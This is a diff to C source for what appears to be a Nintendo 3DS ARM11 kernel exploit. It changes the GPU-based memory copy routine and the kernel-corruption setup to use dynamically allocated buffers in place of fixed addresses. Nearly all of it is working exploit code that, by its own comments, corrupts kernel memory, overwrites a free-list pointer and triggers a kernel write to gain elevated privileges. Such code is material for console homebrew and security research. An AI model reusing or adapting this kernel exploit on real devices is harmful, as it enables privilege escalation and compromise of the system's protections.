@@ -20,15 +20,18 @@ unsigned int *arm11_buffer;
 int do_gshax_copy(void *dst, void *src, unsigned int len, unsigned int check_val, int check_off)
 {
 	unsigned int result;
+	unsigned int check_mem = linearMemAlign(0x10000, 0x40);
 
 	do
 	{
 		GSPGPU_FlushDataCache (NULL, src, len);
 		GX_SetTextureCopy(NULL, src, 0, dst, 0, len, 8);
-		GSPGPU_FlushDataCache (NULL, 0x14401000, 16);
-		GX_SetTextureCopy(NULL, src, 0, 0x14401000, 0, 0x40, 8);
-		result = *(unsigned int *)(0x14401000 + check_off);
+		GSPGPU_FlushDataCache (NULL, check_mem, 16);
+		GX_SetTextureCopy(NULL, src, 0, check_mem, 0, 0x40, 8);
+		result = *(unsigned int *)(check_mem + check_off);
 	} while (result != check_val);
+
+	linearFree(check_mem);
 
 	return 0;
 }
@@ -109,7 +112,9 @@ int arm11_kernel_exploit_setup(void)
 
 	// part 1: corrupt kernel memory
 	// 0xFFFFFE0 is just stack memory for scratch space
-	svcControlMemory(0xFFFFFE0, 0x14411000, 0, 0x1000, 1, 0); // free page 
+	unsigned int mem_hax_mem = linearMemAlign(0x10000, 0x10000);
+	unsigned int mem_hax_mem_free = mem_hax_mem + 0x1000;
+	svcControlMemory(0xFFFFFE0, mem_hax_mem_free, 0, 0x1000, 1, 0); // free page 
 
 	arm11_buffer[0] = 1;
 	arm11_buffer[1] = patch_addr;
@@ -118,12 +123,13 @@ int arm11_kernel_exploit_setup(void)
 
 	// overwrite free pointer
 #ifdef DEBUG_PROCESS
-	printf("Overwriting free pointer\n");
+	printf("Overwriting free pointer %x\n", mem_hax_mem);
 #endif
 
 	//Trigger write to kernel
-	do_gshax_copy(0x14411000, arm11_buffer, 0x10u, patch_addr, 4);
-	svcControlMemory(0xFFFFFE0, 0x14410000, 0, 0x1000, 1, 0);
+	do_gshax_copy(mem_hax_mem_free, arm11_buffer, 0x10u, patch_addr, 4);
+	svcControlMemory(0xFFFFFE0, mem_hax_mem, 0, 0x1000, 1, 0);
+	//linearFree(mem_hax_mem);
 
 #ifdef DEBUG_PROCESS
 	printf("Triggered kernel write\n");
@@ -237,7 +243,6 @@ int doARM11Hax()
 	int result = 0;
 	int i;
 	int (*nop_func)(void);
-	HB_ReprotectMemory(0x14400000, 0x30000 / 4096, 7, &result);
 	HB_ReprotectMemory(nop_slide, 4, 7, &result);
 
 	for (i = 0; i < 0x1000; i++)
